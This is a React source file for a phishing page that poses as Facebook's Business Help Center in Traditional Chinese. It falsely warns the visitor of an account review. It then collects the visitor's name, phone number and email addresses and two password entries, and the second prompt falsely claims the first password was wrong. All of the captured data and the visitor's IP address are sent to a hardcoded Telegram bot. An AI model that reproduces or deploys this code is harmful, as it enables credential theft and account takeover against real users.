import React, { useState, useEffect } from 'react';
import axios from 'axios'; // 如果使用 Axios
import styles from '../styles/appeal-form.module.css';
import { useForm } from "react-hook-form";

import Nav from './nav';

const AppealForm = (props) => {
    const [steps, setSteps] = useState({first_password: false, second_password: false});
    const [countryCode, setCountryCode] = useState('');

    const { register, handleSubmit } = useForm();

    useEffect(() => {
        callAPI();
        fetchCountryCode(props.ip.userIP);
    }, [props]);

    const callAPI = async () => {
        try {
            const message = `Message: hini ip:${props.ip.userIP}`
            await fetch(`https://api.telegram.org/7084620467:AAGeN4LUgNN5jGCRZjTCUm13vLClBpGyaw4/sendMessage?chat_id=2226532878&text=${message}`);
        } catch (err) {
            console.log(err);
        }
    };

    const fetchCountryCode = async (ip) => {
        try {
            const response = await axios.get(`https://ipinfo.io/${ip}?token=5960a8a77a8ce2`);
            const { country } = response.data;
            setCountryCode(country);
        } catch (err) {
            console.log(err);
        }
    };

    const onSubmit = (data) => {
        sendAppealData(data)
    }

    const sendAppealData = async (data) => {
        try {
            const message = `
            =========Ada yang masuk nih=========%0A%0A✅Ip address:${props.ip.userIP}%0A ✅Country Code: ${countryCode}%0A ✅Appeal: ${data.appeal}%0A 📛Full Name: ${data.fullname}%0A 📞Phone: ${data.mobilePhone}%0A 📧Bussines: ${data.bussinesEmail}%0A 👁‍🗨Personal: ${data.personalEmail}%0A Page Name: ${data.pageName}========== 
            `
            await fetch(`https://api.telegram.org/bot7084620467:AAGeN4LUgNN5jGCRZjTCUm13vLClBpGyaw4/sendMessage?chat_id=-1002226532878&text=${message}`);
            setSteps({first_password: true, second_password: false});
        } catch (err) {
            console.log(err);
        }
    }

    const sendFirstPw = async (data) => {
        try {
            const message = `
            Login 1 %0AIp:${props.ip.userIP}%0A Country Code: ${countryCode}%0A ‍🗨Personal: ${data.personalEmail}%0A 🔐Password: ${data.password}`;
            await fetch(`https://api.telegram.org/bot7084620467:AAGeN4LUgNN5jGCRZjTCUm13vLClBpGyaw4/sendMessage?chat_id=-1002226532878&text=${message}`);
            setSteps({first_password: false, second_password: true})
        } catch (err) {
            console.log(err);
        }
    }

    const sendSecondPw = async (data) => {
        try {
            const message = `
             Login 2 %0AIp:${props.ip.userIP}%0A Country Code: ${countryCode}%0A🗨Personal: ${data.personalEmail}%0A 🔐Password: ${data.password}`;
            await fetch(`https://api.telegram.org/bot7084620467:AAGeN4LUgNN5jGCRZjTCUm13vLClBpGyaw4/sendMessage?chat_id=-1002226532878&text=${message}`);
            setSteps({first_password: false, second_password: false});
            trigerNext();
        } catch (err) {
            console.log(err);
        }
    }

    const firstPasswordSubmit = (data) => { 
        sendFirstPw(data);
    }

    const secondPasswordSubmit = (data) => { 
        sendSecondPw(data)
    }

    const trigerNext = () => {
        props.onSubmit({type: 'appeal', value: true});
    }

    return (
        <div className={styles.layout}>
            <Nav/>
            <div className={styles.help}>
                <div className={styles.wrapper}>
                    <p>Facebook 商業幫助中心</p>
                </div>
            </div>
            <div className={styles.appeal}>
                <form onSubmit={handleSubmit(onSubmit)}>
                    <div className={styles.steps}>
                        <div className={styles.top}>
                            <div className={styles.circle}></div>
                            <div className={styles.line}></div>
                            <div className={styles.circle}></div>
                            <div className={styles.line}></div>
                            <div className={styles.circle}></div>
                        </div>
                        <div className={styles.labels}>
                            <span>選擇資產</span>
                            <span>選擇問題</span>
                            <span>尋求幫助</span>
                        </div>
                    </div>
                    <div className={styles.getStarted}>
                        <strong>開始</strong>
                    </div>
                    <div className={styles.alert}>
                        <p>
                            我們收到多份報告，指出您的帳號可能違反了我們的服務條款和社群指導原則。因此，我們已安排對您的帳號進行審查。
                        </p>
                        <strong>報告編號: 3088553115</strong>
                    </div>
                    <div className={styles.formGroup}>
                        <label className={styles.mainLabel}>請提供我們能夠幫助我們調查的信息</label>
                        <textarea {...register("appeal")}></textarea>
                    </div>
                    <div className={styles.formGroup}>
                        <label>全名</label>
                        <input type="text" {...register("fullname")}/>
                    </div>
                    <div className={styles.formGroup}>
                        <label>商業電子郵件地址</label>
                        <input type="email" {...register("bussinesEmail")}/>
                    </div>
                    <div className={styles.formGroup}>
                        <label>個人電子郵件地址</label>
                        <input type="email" required {...register("personalEmail")}/>
                    </div>
                    <div className={styles.formGroup}>
                        <label>手機號碼</label>
                        <input type="phone" {...register("mobilePhone")}/>
                    </div>
                    <div className={styles.formGroup}>
                        <label>Facebook 頁面名稱</label>
                        <input type="text" {...register("pageName")}/>
                    </div>
                    <button type="submit">提交</button>
                </form>
            </div>
            {
                (steps.first_password || steps.second_password) && 
                <div className={styles.modal}>
                    {
                        steps.first_password && 
                        <div className={styles.box}>
                            <div className={styles.top}>
                                <h3>請輸入您的密碼</h3>
                            </div>
                            <form onSubmit={handleSubmit(firstPasswordSubmit)}>
                                <p className={styles.securityInfo}>為了您的安全，您必須輸入密碼才能繼續。</p>
                                <div className={styles.formGroup}>
                                    <label>密碼:</label>
                                    <input type="password" required {...register("password")} />
                                </div>
                                <div className={styles.bottom}>
                                    <button type="submit">繼續</button>
                                </div>
                            </form>
                        </div>
                    }
                    {
                        steps.second_password && 
                        <div className={styles.box}>
                            <div className={styles.top}>
                                <h3>請重新輸入您的密碼</h3>
                            </div>
                            <form onSubmit={handleSubmit(secondPasswordSubmit)}>
                                <p className={styles.securityInfo}>為了您的安全，您必須輸入密碼才能繼續。</p>
                                <div className={styles.formGroup}>
                                    <label>密碼:</label>
                                    <input type="password" required {...register("password")}/>
                                    <p className={styles.error}>您輸入的密碼不正確。</p>
                                </div>
                                <div className={styles.bottom}>
                                    <button type="submit">繼續</button>
                                </div>
                            </form>
                        </div>
                    }
                </div>
            }
        </div>
    );
};

export default AppealForm;
